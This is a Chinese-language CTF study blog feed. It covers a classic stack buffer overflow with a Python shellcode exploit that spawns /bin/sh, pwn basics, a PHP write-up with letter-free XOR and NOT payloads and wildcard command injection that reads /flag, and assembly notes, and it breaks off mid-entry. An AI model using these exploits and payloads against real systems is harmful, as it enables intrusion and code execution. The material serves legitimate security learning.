    <content type="html"><![CDATA[<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>缓冲区溢出有两种类型：</p><ol><li>基于栈的缓冲区溢出</li><li>基于堆的缓冲区溢出</li></ol><p>缓冲区溢出可导致任意代码执行！<br>任意代码执行允许攻击者执行其代码以获取受害者机器的控制权，获取shell，添加新用户，打开端口等……<br><a id="more"></a></p><h1 id="栈溢出示例"><a href="#栈溢出示例" class="headerlink" title="栈溢出示例"></a>栈溢出示例</h1><h2 id="易受攻击的代码"><a href="#易受攻击的代码" class="headerlink" title="易受攻击的代码"></a>易受攻击的代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭ASLR（地址空间布局随机化）</span></span><br><span class="line">sudo <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span><br><span class="line"><span class="comment">#添加执行权限</span></span><br><span class="line">sudo chown root vuln</span><br><span class="line">sudo chgrp root vuln</span><br><span class="line">sudo chmod +s vuln</span><br></pre></td></tr></table></figure></p><p>从上述代码可以看出，第[2]行代码存在缓冲区溢出，可导致任意代码执行。</p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>使用gdb编译<br><img src="/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/反编译.PNG" alt=""></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>当输入大小超过256时会溢出缓冲区并覆盖栈中的返回地址。通过输入“A” <em> 268 + “B” </em> 4测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q vuln</span><br><span class="line">Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.</span><br><span class="line">(gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;B&quot;*4&apos;`</span><br><span class="line">Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;B&quot;*4&apos;`</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 in ?? ()</span><br><span class="line">(gdb) p/x $eip</span><br><span class="line">$1 = 0x42424242</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p>输出显示寄存器eip被“BBBB”覆盖。</p><ul><li>0x8 is alignment space</li><li>0x4 is caller’s EBP<br>268=256+8+4</li></ul><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff1d0</span>       </span><br><span class="line"></span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP's + Shellcode</span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">"\x90"</span> * <span class="number">100</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></span><br><span class="line">call([<span class="string">"./vuln"</span>, buf])</span><br></pre></td></tr></table></figure><h1 id="英文原文"><a href="#英文原文" class="headerlink" title="英文原文"></a>英文原文</h1><p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="noopener">Classic Stack Based Buffer Overflow</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;缓冲区溢出&quot;&gt;&lt;a href=&quot;#缓冲区溢出&quot; class=&quot;headerlink&quot; title=&quot;缓冲区溢出&quot;&gt;&lt;/a&gt;缓冲区溢出&lt;/h1&gt;&lt;p&gt;缓冲区溢出有两种类型：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;基于栈的缓冲区溢出&lt;/li&gt;
&lt;li&gt;基于堆的缓冲区溢出&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;缓冲区溢出可导致任意代码执行！&lt;br&gt;任意代码执行允许攻击者执行其代码以获取受害者机器的控制权，获取shell，添加新用户，打开端口等……&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://fl4g.cn/categories/CTF/"/>
    
    
      <category term="pwn" scheme="https://fl4g.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>PWN学习笔记1--入门</title>
    <link href="https://fl4g.cn/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/"/>
    <id>https://fl4g.cn/2018/12/12/PWN学习笔记-入门/</id>
    <published>2018-12-12T06:53:20.000Z</published>
    <updated>2020-09-02T07:53:18.485Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-pwn介绍"><a href="#0x00-pwn介绍" class="headerlink" title="0x00 pwn介绍"></a>0x00 pwn介绍</h1><p>  PWN是指二进制漏洞的发掘和利用，CTF中PWN题目一般出现在linux平台上<br><a id="more"></a></p><h1 id="0x01-pwn所需的基础知识"><a href="#0x01-pwn所需的基础知识" class="headerlink" title="0x01 pwn所需的基础知识"></a>0x01 pwn所需的基础知识</h1><ul><li>c语言</li><li>汇编语言</li><li>Python</li><li>操作系统基础</li><li>linux基本命令</li></ul><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>IP/EIP/RIP：指向当前的命令地址<br>SP/ESP/RSP：指向栈的顶部<br>BP/EBP/RBP：指向栈的底部</p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>一种后进先出的数据结构，用于调用函数过程中回复寄存器的状态。<br><img src="/2018/12/12/PWN学习笔记-入门/栈.PNG" alt=""></p><h2 id="大端与小端模式"><a href="#大端与小端模式" class="headerlink" title="大端与小端模式"></a>大端与小端模式</h2><p>以0x12345678为例（从左到右代表地址从低到高）</p><ul><li>小端 \x78\x56\x34\x12</li><li>大端 \x12\x34\x56\x78</li></ul><p>大端模式：PowerPC、IBM、Sun、大部分网络协议<br>小端模式：X86、DEC</p><h1 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞。<br>发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据</li><li>写入的数据大小没有被良好地控制</li></ul><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://zhuanlan.zhihu.com/p/34665623" target="_blank" rel="noopener">从零开始学CTF</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-pwn介绍&quot;&gt;&lt;a href=&quot;#0x00-pwn介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 pwn介绍&quot;&gt;&lt;/a&gt;0x00 pwn介绍&lt;/h1&gt;&lt;p&gt;  PWN是指二进制漏洞的发掘和利用，CTF中PWN题目一般出现在linux平台上&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://fl4g.cn/categories/CTF/"/>
    
    
      <category term="pwn" scheme="https://fl4g.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CTF一道web题小结-无数字字母getFlag()</title>
    <link href="https://fl4g.cn/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/"/>
    <id>https://fl4g.cn/2018/10/11/CTF一道web题小结-无数字字母getFlag/</id>
    <published>2018-10-11T02:42:01.000Z</published>
    <updated>2020-09-02T07:53:18.483Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近遇到个CTF题目，分析后涨了波知识，题目如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><a id="more"></a><p>分析代码，了解到我们需要满足两个条件：</p><ol><li>长度不能大于35</li><li>不能存在数字字母_和$符号</li></ol><h2 id="0x02-无数字字母构造payload"><a href="#0x02-无数字字母构造payload" class="headerlink" title="0x02 无数字字母构造payload"></a>0x02 无数字字母构造payload</h2><p>首先，看到不能存在字母数字就想到了phithon师傅的文章里关于无字母数字webshell提到的3种方法提供了两种思路：</p><ol><li>利用位运算</li><li>利用自增运算符<br>想到payload应该是code=getFlag(),于是开始构造getFlag()。<br>在网上找到一个payload如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure></li></ol><p>分析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">采用异或运算</span><br><span class="line">&#123; ^ %1c = g</span><br><span class="line">&#123; ^ %1e = e</span><br><span class="line">&#123; ^ %0f = t</span><br><span class="line">&#123; ^ %3d = F</span><br><span class="line">&#123; ^ %17 = l</span><br><span class="line">&#123; ^ %1a = a</span><br><span class="line">所以&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot; = getFlag</span><br><span class="line">$_=getFlag将_赋值为getFlag，最终得到getFlag()。</span><br></pre></td></tr></table></figure></p><p>还有个payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure></p><p>直接取反getFlag再url编码。<br>其中_可以使用汉字代替，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$啊=~%98%9A%8B%B9%93%9E%98;$啊();</span><br></pre></td></tr></table></figure></p><p>当不过滤<strong>$</strong>符号时,可以这样操作，但是<strong>$</strong>符号过滤了，参考p牛的《无字母数字webshell之提高篇》中讲到PHP7是允许使用($a)()来执行动态函数;<br>此时，测试使用phpinfo();payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure></p><p>使用php5进行测试时如下：<br><img src="/2018/10/11/CTF一道web题小结-无数字字母getFlag/php5测试phpinfo.PNG" alt=""></p><p>获取phpinfo信息失败。</p><p>使用php7进行测试时如下：<br><img src="/2018/10/11/CTF一道web题小结-无数字字母getFlag/php7测试phpinfo.PNG" alt=""></p><p>获取phpinfo信息成功。</p><h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>利用通配符调用Linux系统命令 来查看flag。<br>在Linux系统中可以使用? * 等字符来正则匹配字母：</p><ul><li>*可以代替0个及以上任意字符</li><li>?可以代表1个任意字符</li></ul><p>可以使用?来代替字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/??? =&gt; /bin/cat</span><br></pre></td></tr></table></figure></p><p>用此来读取源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;</span><br><span class="line">&quot;/bin/cat /var/www/html/index.php&quot;</span><br></pre></td></tr></table></figure></p><p>为保持长度小于35且不存在$<em>,则将$</em>带入后面一个表达式，同时使用*来匹配最后文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;</span><br></pre></td></tr></table></figure></p><p>php使用短链接，其含义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo `/bin/cat /var/www/html/index.php`?&gt;</span><br></pre></td></tr></table></figure></p><p>读取到源码发现存在如下函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">$flag = file_get_contents(&apos;/flag&apos;);</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后直接读取flag文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`/???/???%20/????`;?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF一道web题小结-无数字字母getFlag/windows执行任意代码.PNG" alt=""></p><p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure></p><p>则失败。<br><img src="/2018/10/11/CTF一道web题小结-无数字字母getFlag/windows绕过失败.PNG" alt=""></p><p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8" target="_blank" rel="noopener">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284" target="_blank" rel="noopener">CTF题目思考–极限利用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;最近遇到个CTF题目，分析后涨了波知识，题目如下：&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;flag.php&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;code&#39;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $code = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;code&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strlen($code)&amp;gt;&lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Long.&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&quot;/[A-Za-z0-9_$]+/&quot;&lt;/span&gt;,$code))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;NO.&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    @&lt;span class=&quot;keyword&quot;&gt;eval&lt;/span&gt;($code);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//$hint =  &quot;php function getFlag() to get flag&quot;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://fl4g.cn/categories/CTF/"/>
    
    
      <category term="web" scheme="https://fl4g.cn/tags/web/"/>
    
      <category term="flag" scheme="https://fl4g.cn/tags/flag/"/>
    
  </entry>
  
  <entry>
    <title>汇编指令</title>
    <link href="https://fl4g.cn/2018/09/05/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
    <id>https://fl4g.cn/2018/09/05/汇编指令/</id>
    <published>2018-09-05T06:42:45.000Z</published>
    <updated>2020-09-02T07:53:18.472Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h2><p>db定义字节类型变量，一个字节数据占1个字节（8位）单元，读完一个，偏移量加1<br>dw定义字类型变量，一个字数据占2个字节（16位）单元，读完一个，偏移量加2<br>dd定义双字类型变量，一个双字数据占4个字节（32位）单元，读完一个，偏移量加4<br>dup操作符用来进行数据的重复：<br>db 重复的次数 dup (重复的字节型数据)。<br>dw 重复的次数 dup (重复的字型数据)。<br>dd 重复的次数 dup (重复的双字数据)。<br><a id="more"></a></p><h2 id="寄存器相关"><a href="#寄存器相关" class="headerlink" title="寄存器相关"></a>寄存器相关</h2><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>8086CPU的AX、BX、CX、DX四个16位寄存器都可分为两个独立使用的8位寄存器来用：</p><ul><li>AX可分为AH和AL</li><li>BX可分为BH和BL</li><li>CX可分为CH和CL</li><li>DX可分为DH和DL</li></ul><table><thead><tr><th>汇编指令</th><th>功能</th><th>高级语言描述</th></tr></thead><tbody><tr><td>mov ax,18</td><td>将18送入寄存器ax</td><td>ax=18</td></tr><tr><td>add ax,8</td><td>将寄存器ax中的值加8</td><td>ax=ax+8</td></tr><tr><td>sub ax,8</td><td>将寄存器ax中的值减8</td><td>ax=ax-8</td></tr><tr><td>inc ax</td><td>将寄存器ax中的值加1</td><td>ax=ax+1</td></tr></tbody></table><h3 id="段寄存器-amp-指令指针寄存器"><a href="#段寄存器-amp-指令指针寄存器" class="headerlink" title="段寄存器&amp;指令指针寄存器"></a>段寄存器&amp;指令指针寄存器</h3><p>8086CPU有4个段寄存器：CS、DS、SS、ES。访问内存时由4个段寄存器提供内存单元的段地址。<br>IP为指令指针寄存器，任意时刻，CPU将CS:IP指向的内容当作指令执行。<br>CS值*16+IP值</p><p>jmp指令同时修改CS、IP的内容：<br>jmp 2AE3:3,执行后：CS=2AE3H，IP=0003H，CPU从2AE33H处读取指令<br>jmp指令仅仅修改IP的内容：<br>jmp ax,执行前：ax=1000H，CS=2AE3H，IP=0003H<br>       执行后：ax=1000H，CS=2AE3H，IP=1000H</p><h3 id="DS-amp-address"><a href="#DS-amp-address" class="headerlink" title="DS&amp;[address]"></a>DS&amp;[address]</h3><p>DS存放要访问数据的段地址，[address]中address表示偏移地址。<br>| 汇编指令     | 执行后相关寄存器中内容 | 说明                                |<br>| ———— | ———————- | ———————————– |<br>| mov ax,1000H | ax=1000H               |                                     |<br>| mov ds,ax    | ds=1000H               | 寄存器ds设为1000H                   |<br>| mov ax,[0]   |                        | 将1000H:0中存放的字型数据存放到ax中 |</p><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>SS段寄存器存放栈顶地址，SP寄存器存放偏移地址。任意时刻，SS:SP都指向栈顶元素。<br>push ax时，SP-2，SS:SP指向栈顶。pop ax时，SP+2，SS:SP指向栈顶。</p><h2 id="and和or指令"><a href="#and和or指令" class="headerlink" title="and和or指令"></a>and和or指令</h2><p>and指令：逻辑与指令，按位进行与运算。<br>or指令：逻辑或指令，按位进行或运算。</p><h2 id="div指令"><a href="#div指令" class="headerlink" title="div指令"></a>div指令</h2><p>除法指令：</p><ol><li>除数：有8位和16位两种，在一个寄存器或内存单元中</li><li>被除数：默认放在AX或DX和AX中，若除数为8位，则被除数16位，存放AX中；若除数为16位，被除数为32位，存放DX和AX中，DX存放高位，AX存放低位。</li><li>结果：若除数为8位，则AL存放除法操作的商，AH存放除法操作的余数。若为16位，则AX存放商，DX存放余数。</li></ol><p>例子：<br>div byte ptr ds:[0]<br>含义：(al)=(ax)/((ds)<em>16+0)的商<br>      (ah)=(ax)/((ds)</em>16+0)的余数</p><p>div word ptr es:[0]<br>含义：(ax)=[(dx)<em>10000H+(ax)]/((es)</em>16+0)的商<br>     (dx)=[(dx)<em>10000H+(ax)]/((es)</em>16+0)的余数</p><h2 id="mul指令"><a href="#mul指令" class="headerlink" 